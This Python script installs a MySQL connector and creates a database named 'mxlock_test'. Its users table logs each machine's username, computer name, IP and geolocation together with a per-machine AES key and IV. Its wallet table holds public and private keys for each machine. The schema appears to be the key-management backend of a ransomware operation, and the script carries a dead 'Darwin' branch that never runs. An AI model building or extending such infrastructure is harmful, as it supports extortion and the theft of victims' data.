import os

if os.name == "posix":
    os.system("python3 -m pip install mysql-connector-python")
elif os.name == "nt":
    os.system("pip install mysql-connector-python")
elif os.name == "Darwin":
    os.system("brew install mysql")
    os.system("pip install mysql-connector-python")
    
import mysql.connector as mysql

def connect():
    return mysql.connect(
        host="localhost",
        user="root",
        password="",
        database="mxlock_test"
    )
    
if __name__ == "__main__":
    db = connect()
    cursor = db.cursor()
    
    
    try:
        cursor.execute("DROP TABLE IF EXISTS wallet")
        cursor.execute("DROP TABLE IF EXISTS users")
    except (mysql.Error, mysql.Warning) as e: 
        print(e)
        
    
    try:
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        uuid VARCHAR(255) UNIQUE,
        username VARCHAR(255),
        computername VARCHAR(255),
        langId INT,
        country VARCHAR(255),
        region VARCHAR(255),
        city VARCHAR(255),
        lat DOUBLE,
        `long` DOUBLE,
        osversion INT,
        AESKey VARCHAR(255),
        iv VARCHAR(255),
        ip VARCHAR(255),
        date DATE,
        time TIME
        )
        """)
    except (mysql.Error, mysql.Warning) as e:
        print(e)
        exit()
        
    try:
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS wallet (
        id INT AUTO_INCREMENT PRIMARY KEY,
        uuid VARCHAR(255) UNIQUE,
        publicKey VARCHAR(255),
        privateKey VARCHAR(255),
        FOREIGN KEY (uuid) REFERENCES users(uuid) ON DELETE CASCADE ON UPDATE CASCADE
        )
        """)
    except (mysql.Error, mysql.Warning) as e:
        print(e)
        exit()
                
    cursor.close()
    db.commit()
    db.close()
    
    print("Database created successfully")